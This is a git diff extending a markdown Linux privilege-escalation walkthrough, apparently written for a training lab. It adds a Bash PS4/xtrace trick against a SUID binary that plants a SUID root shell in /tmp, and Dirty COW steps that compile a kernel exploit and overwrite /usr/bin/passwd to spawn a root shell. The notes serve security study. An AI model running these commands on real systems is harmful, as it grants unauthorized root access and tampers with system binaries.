@@ -619,7 +619,7 @@ PATH=.:$PATH /usr/local/bin/suid-env
 
 After running the command, the **SUID** program will execute your custom `service` binary, and you'll gain a **root shell**.
 
-# 🛠️ SUID Abusing shell features
+# 🛠️ SUID Abusing shell features (1)
 
 ### 1. **Verify the Use of Absolute Path**
 
@@ -670,4 +670,88 @@ Now, execute the `/usr/local/bin/suid-env2` program:
 
 Instead of starting the actual **apache2** web server, your exported Bash function will be executed, giving you a **root shell**.
 
+
+# 📝️ SUID Abusing shell features (2)
+
+
+
+### 1. **Enable Bash Debugging and Set `PS4` for Exploitation**
+
+You can take advantage of Bash’s debugging mode by setting the `PS4` environment variable to execute a command. In this case, it will copy `/bin/bash` to `/tmp/rootbash` and set the SUID bit on it to give root privileges. Use the following command:
+
+```bash
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+- `env -i`: Clears the environment variables.
+- `SHELLOPTS=xtrace`: Enables Bash tracing, printing each command before execution.
+- `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'`: This sets the command to be executed when a line is traced.
+- `/usr/local/bin/suid-env2`: The vulnerable SUID executable.
+
+This command creates a SUID copy of `/bin/bash` named `rootbash` in the `/tmp` directory.
+
+---
+
+### 2. **Run the Exploit**
+
+After running the above command, the `/tmp/rootbash` executable will be created with SUID privileges.
+
+---
+
+### 3. **Gain Root Shell**
+
+Now, execute the **SUID** `rootbash` with the `-p` option to preserve elevated privileges and gain a root shell:
+
+```bash
+/tmp/rootbash -p
+```
+
+
+**Note:** This method **does not work** on Bash versions **4.4 and above** due to changes in how `PS4` is handled in newer versions of Bash.
+
+# ⚠️ Kernal Exploits
+
+### 1. **Run the Linux Exploit Suggester**
+
+Use the **Linux Exploit Suggester 2** tool to identify potential kernel exploits, including **Dirty COW**:
+
+```bash
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+```
+
+Check the output to confirm if **Dirty COW** is listed as a possible exploit for the kernel.
+
+---
+
+### 2. **Compile the Dirty COW Exploit Code**
+
+The exploit code for **Dirty COW** is located at `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. Compile the code using **gcc**:
+
+```bash
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+```
+
+- `-pthread`: This flag enables multi-threading, which is required for the exploit.
+
+---
+
+### 3. **Run the Dirty COW Exploit**
+
+Execute the compiled **Dirty COW** exploit. This exploit will replace the **SUID** file `/usr/bin/passwd` with a modified version that spawns a root shell. A backup of the original `/usr/bin/passwd` is saved to `/tmp/bak`.
+
+```bash
+./c0w
+```
+
+Note: The exploit may take a few minutes to complete.
+
+---
+
+### 4. **Gain Root Access**
+
+Once the exploit has completed, execute the modified **passwd** command to gain a root shell:
+
+```bash
+/usr/bin/passwd
+```
 
